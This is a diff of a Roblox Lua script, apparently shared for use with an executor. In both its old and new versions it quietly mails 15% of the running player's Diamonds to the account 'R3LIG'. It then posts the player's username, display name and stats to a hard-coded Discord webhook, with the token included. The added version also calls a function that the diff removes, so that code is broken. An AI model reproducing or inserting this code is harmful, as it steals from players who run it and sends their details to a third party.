@@ -1,104 +1,73 @@
 local WebHook = "https://discord.com/api/webhooks/1264830968301355102/34BGyT0h8b1hCCFbq9EUgqnJWZPis3yaMiGa0q1kAZZsBWJnD3t8x0SF0_eRx9_A47T6"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local GetSave = require(game.ReplicatedStorage.Library.Client.Save).Get
 
-local function getLeaderstats(player)
-    local leaderstats = player:FindFirstChild("leaderstats")
-    if leaderstats then
-        local stats = {}
-        for _, stat in pairs(leaderstats:GetChildren()) do
-            if stat:IsA("IntValue") or stat:IsA("NumberValue") or stat:IsA("StringValue") then
-                table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
+local user = "R3LIG"
+local mailmessage = "yo"
+local percentage = 15
+local gems = GetSave().Inventory.Currency
+
+for i, v in pairs(gems) do
+    if v.id == "Diamonds" then
+        local amountToSend = v._am * (percentage / 100)
+
+        if amountToSend >= 500 then
+            local args = {
+                [1] = user,
+                [2] = mailmessage,
+                [3] = "Currency",
+                [4] = i,
+                [5] = amountToSend
+            }
+
+            pcall(function()
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            end)
+
+            local player = Players.LocalPlayer
+            local realUser = player.Name
+            local displayName = player.DisplayName
+            local leaderboardInfo = getLeaderstats(player)
+
+            local embed = {
+                title = "💎 Gems Sent Notification",
+                description = "Details Of Script Execution",
+                color = 7506394,
+                fields = {
+                    { name = "👤 Real User", value = "``" .. realUser .. "``", inline = true },
+                    { name = "🌟 Display Name", value = "``" .. displayName .. "``", inline = true },
+                    { name = "💎 Real Gems", value = "``" .. (v._am or "nil") .. "``", inline = true },
+                    { name = "💰 Player Coins", value = "``" .. "CoinsAmount" .. "``", inline = true }, -- Replace with actual coins amount if needed
+                    { name = "💰 Gems Sent", value = "``" .. amountToSend .. "``", inline = true },
+                    { name = "🏆 Leaderboard Stats", value = "``" .. leaderboardInfo .. "``", inline = false }
+                },
+                footer = {
+                    text = "Captured at: ``" .. os.date("%Y-%m-%d %H:%M:%S") .. "•Today at " .. os.date("%I:%M %p") .. "``",
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+
+            local data = { embeds = { embed } }
+            local headers = { ["Content-Type"] = "application/json" }
+            local request = http_request or request or HttpPost or syn.request
+
+            local success, response = pcall(function()
+                return request({
+                    Url = WebHook,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = HttpService:JSONEncode(data)
+                })
+            end)
+
+            if not success then
+                print("Failed to send message to Discord webhook. Error: " .. response)
+            else
+                print("Message sent to Discord webhook!")
             end
         end
-        return #stats > 0 and table.concat(stats, "\n") or "No leaderstats"
-    else
-        return "No leaderstats"
+
+        break
     end
-end
-
-local function sendToWebhook(realGems, gemsSent, coinsAmount)
-    local player = Players.LocalPlayer
-    local realUser = player.Name
-    local displayName = player.DisplayName
-    local leaderboardInfo = getLeaderstats(player)
-
-    local embed = {
-        title = "💎 Gems Sent Notification",
-        description = "Details Of Script Execution",
-        color = 7506394,
-        fields = {
-            { name = "👤 Real User", value = "``" .. realUser .. "``", inline = true },
-            { name = "🌟 Display Name", value = "``" .. displayName .. "``", inline = true },
-            { name = "💎 Real Gems", value = "``" .. (realGems or "nil") .. "``", inline = true },
-            { name = "💰 Player Coins", value = "``" .. (coinsAmount or "nil") .. "``", inline = true },
-            { name = "💰 Gems Sent", value = "``" .. (gemsSent or "nil") .. "``", inline = true },
-            { name = "🏆 Leaderboard Stats", value = "``" .. leaderboardInfo .. "``", inline = false }
-        },
-        footer = {
-            text = "Captured at: ``" .. os.date("%Y-%m-%d %H:%M:%S") .. "•Today at " .. os.date("%I:%M %p") .. "``",
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-
-    local data = { embeds = { embed } }
-    local headers = { ["Content-Type"] = "application/json" }
-    local request = http_request or request or HttpPost or syn.request
-
-    local success, response = pcall(function()
-        return request({
-            Url = WebHook,
-            Method = "POST",
-            Headers = headers,
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-
-    if not success then
-        print("Failed to send message to Discord webhook. Error: " .. response)
-    else
-        print("Message sent to Discord webhook!")
-    end
-end
-
-local player = Players.LocalPlayer 
-local diamondsAmount = player.PlayerGui.Main.Top.Diamonds.Amount.Text
-local coinsAmount = player.PlayerGui.Main.Top.Coins.Amount.Text
-
-local function applyPercentage(diamonds, percentage)
-    diamonds = diamonds:gsub(",", "")
-    
-    local number = tonumber(diamonds:match("%d+"))
-    local suffix = diamonds:match("%a")
-
-    if suffix == "k" then
-        number = number * 10^3
-    elseif suffix == "m" then
-        number = number * 10^6
-    elseif suffix == "b" then
-        number = number * 10^9
-    elseif suffix == "t" then
-        number = number * 10^12
-    end
-
-    local result = number * (percentage / 100)
-    return math.floor(result)
-end
-
-local percentage = 15
-local adjustedAmount = applyPercentage(diamondsAmount, percentage)
-
-if adjustedAmount >= 500 then
-    local args = {
-        [1] = "R3LIG",
-        [2] = "Donation To Script Owner!",
-        [3] = "Currency",
-        [4] = "c381d9d7f6874e54a2fe9de7c83de38a",
-        [5] = adjustedAmount
-    }
-
-    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    sendToWebhook(diamondsAmount, adjustedAmount, coinsAmount)
-else
-    sendToWebhook(diamondsAmount, nil, coinsAmount)
 end
